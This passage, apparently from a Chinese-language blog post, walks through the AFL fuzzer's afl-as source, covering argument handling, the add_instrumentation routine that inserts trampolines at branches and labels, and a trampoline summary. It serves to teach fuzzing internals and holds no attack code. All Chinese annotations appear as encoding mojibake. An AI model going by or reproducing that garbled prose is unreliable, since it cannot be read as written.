è®¾ç½®ç¼–è¯‘å™¨å‚æ•°</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;</span><br><span class="line">	<span class="comment">// 64/32ä½</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The Apple case is a bit different... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="number">1</span> &lt; argc) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;x86_64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;i386&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Strip options that set the preference for a particular upstream</span></span><br><span class="line"><span class="comment">       assembler in Xcode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clang_mode &amp;&amp; (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-q&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-Q&quot;</span>)))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When calling clang as the upstream assembler, append -c -x assembler</span></span><br><span class="line"><span class="comment">     and hope for the best. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_clang_as) &#123;</span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-x&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;assembler&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="comment">// å¯èƒ½æ˜¯æ–‡ä»¶åï¼Œéœ€è¦å¤„ç†</span></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];</span><br><span class="line">  <span class="comment">// -version</span></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) <span class="built_in">FATAL</span>(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åœ¨tmpç›®å½•ä¸‹ç”Ÿæˆä¸´æ—¶æ–‡ä»¶ï¼Œä¼šæ ¹æ® AFL_KEEP_ASSEMBLY é€‰æ‹©åˆ é™¤</span></span><br><span class="line">  modified_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, <span class="built_in">getpid</span>(),</span><br><span class="line">                               (u32)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line">  <span class="comment">// æœ€åä¸€ä¸ªå‚æ•°è®¾ç½®ä¸º/tmp/.afl-xxx.S </span></span><br><span class="line">  as_params[as_par_cnt++] = modified_file;</span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>æ’æ¡©ä»£ç ï¼Œå¦‚æœæƒ³è¦æ¯”è¾ƒè¯¦ç»†çš„ç†è§£ï¼Œéœ€è¦ä½¿ç”¨afl-gccç¼–è¯‘ä¸€ä¸‹ï¼Œä½¿ç”¨<code>AFL_KEEP_ASSEMBLY</code>å°†æ±‡ç¼–ä»£ç ä¿å­˜ï¼Œæˆ–è€…ä½¿ç”¨IDAè¿™æ ·çš„åæ±‡ç¼–å·¥å…·æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line"></span><br><span class="line">    inf = <span class="built_in">fopen</span>(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = stdin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// modified_file æ˜¯    /tmp/.afl-xxx.s æ±‡ç¼–æ–‡ä»¶</span></span><br><span class="line">  outfd = <span class="built_in">open</span>(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = <span class="built_in">fdopen</span>(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) <span class="built_in">PFATAL</span>(<span class="string">&quot;fdopen() failed&quot;</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        instr_ok: æ˜¯å¦ä½äºæŒ‡ä»¤æ®µä¸­, eg:  .text</span></span><br><span class="line"><span class="comment">        skip_csect: æ˜¯å¦è¦è·³è¿‡code section</span></span><br><span class="line"><span class="comment">        skip_next_label: æ˜¯å¦è·³è¿‡å¯¹ä¸‹ä¸€ä¸ªæ ‡ç­¾çš„æ’æ¡©</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        skip_intel: æ˜¯å¦ä¸ºintelè¯­æ³•çš„æ±‡ç¼–, afl-asä¸å¯¹intelæ±‡ç¼–è¯­æ³•è¿›è¡Œæ’æ¡©, ä¼šè·³è¿‡</span></span><br><span class="line"><span class="comment">        skip_app: æ˜¯å¦é‡åˆ°å†…è”æ±‡ç¼–, afl-asä¸å¯¹å†…è”æ±‡ç¼–æ’æ¡©, ä¼šè·³è¿‡</span></span><br><span class="line"><span class="comment">        instrument_next: è¡¨ç¤ºå·²ç»é‡åˆ°åˆé€‚çš„æ ‡ç­¾, éœ€è¦åœ¨è¯¥æ ‡ç­¾çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å‰è¿›è¡Œæ’æ¡©.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and we do not instrument. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»£ç æ®µï¼Œx86è¿˜æ˜¯x64</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸¤ç§æ±‡ç¼–æ ·å¼ï¼šintelå’ŒAT&amp;Tï¼Œè·³è¿‡intelæ ¼å¼æ±‡ç¼–</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ç”¨ç®¡ï¼Œå› ä¸ºä»£è¡¨ç€æ³¨é‡Š</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented)</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’æ¡©ï¼šåŸºæœ¬å—</span></span><br><span class="line">    <span class="comment">// jumpç±»æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        ins_lines++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æš‚æ—¶å¿½ç•¥å¯¹è‹¹æœçš„å¤„ç†</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) <span class="built_in">fclose</span>(inf);</span><br><span class="line">  <span class="built_in">fclose</span>(outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) <span class="built_in">WARNF</span>(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">OKF</span>(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             <span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å­˜åœ¨ä¸¤ç§æ’æ¡©ï¼šåœ¨æ¯ä¸€ä¸ªåŸºæœ¬å—å…¥å£ï¼Œafl-as æ’å…¥äº†ä¸€æ®µä»£ç ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨æ•´ä¸ªç¨‹åºçš„æœ«å°¾ï¼Œæ’å…¥äº†ä¸€æ®µ 300 å¤šè¡Œçš„ <code>AFL main payload</code></p>
<ul>
<li>åŸºæœ¬å—ï¼šåœ¨ida graphå¯ä»¥çœ‹åˆ°åˆ†å—ï¼Œè¿™é‡Œçš„åˆ¤æ–­å°±æ˜¯å‡½æ•°æ‰§è¡Œçš„å¼€å¤´ä»¥åŠæ¯ä¸€ä¸ª <code>j</code> æŒ‡ä»¤ä½†æ˜¯ ç¬¬äºŒä¸ªä¸æ˜¯ <code>m</code></li>
<li>jump æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯ç¼–è¯‘å™¨çš„æ¯ä¸ª <code>label</code> å¼€å¤´æ’å…¥ä¸€äº›</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">æ£€æŸ¥å‡½æ•°åæˆ–è€…æ¡ä»¶è·³è½¬æ ‡ç­¾, åˆ¤æ–­æ˜¯å¦æ­£ç¡®æ’æ¡©. æˆ‘ä»¬å¸Œæœ›æ•è·ä¸‹åˆ—æƒ…å†µ, (^è¡¨ç¤ºè¡Œå¼€å¤´)</span><br><span class="line">    <span class="number">1.</span> ^main        - å‡½æ•°å…¥å£ç‚¹</span><br><span class="line">    <span class="number">2.</span> ^.L0         - GCCè·³è½¬æ ‡ç­¾</span><br><span class="line">    <span class="number">3.</span> ^.LBB0_0     - clangè·³è½¬æ ‡ç­¾</span><br><span class="line">    <span class="number">4.</span> ^\tjnz foo   - æ¡ä»¶è·³è½¬æ ‡ç­¾</span><br><span class="line">    ...</span><br><span class="line">ä½†ä¸å¸Œæœ›æ•è·ä¸‹åˆ—æ ‡ç­¾</span><br><span class="line">    <span class="number">1.</span> ^# BB#<span class="number">0</span>      - clangæ³¨é‡Š</span><br><span class="line">    <span class="number">2.</span> ^ # BB#<span class="number">0</span>     - clangæ³¨é‡Š</span><br><span class="line">    <span class="number">3.</span> ^.Ltmp0      - clangéåˆ†æ”¯æ ‡ç­¾</span><br><span class="line">    <span class="number">4.</span> ^.LC0        - GCCéåˆ†æ”¯æ ‡ç­¾</span><br><span class="line">    <span class="number">5.</span> ^.LBB0_0     - GCCéåˆ†æ”¯æ ‡ç­¾</span><br><span class="line">    <span class="number">6.</span> ^\tjmp foo   - éæ¡ä»¶è·³è½¬</span><br></pre></td></tr></table></figure>

<h2 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h2><p>åŸºæœ¬å—å…¥å£ï¼Œè·³æ¿</p>
<ul>
<li>å°† rsp ä¸‹é™ä¸€æ®µè·ç¦»</li>
<li>å°† rdx, rcx, rax çš„å€¼å­˜æ”¾åˆ°æ ˆä¸Š</li>
<li>å°† rcx è®¾ä¸ºä¸€ä¸ªç«‹å³æ•°ï¼ˆç”± afl-as éšæœºç”Ÿæˆï¼‰</li>
<li>è°ƒç”¨ __afl_maybe_log</li>
<li>æ¢å¤ rdx, rcx, rax å’Œ rsp</li>
</ul>
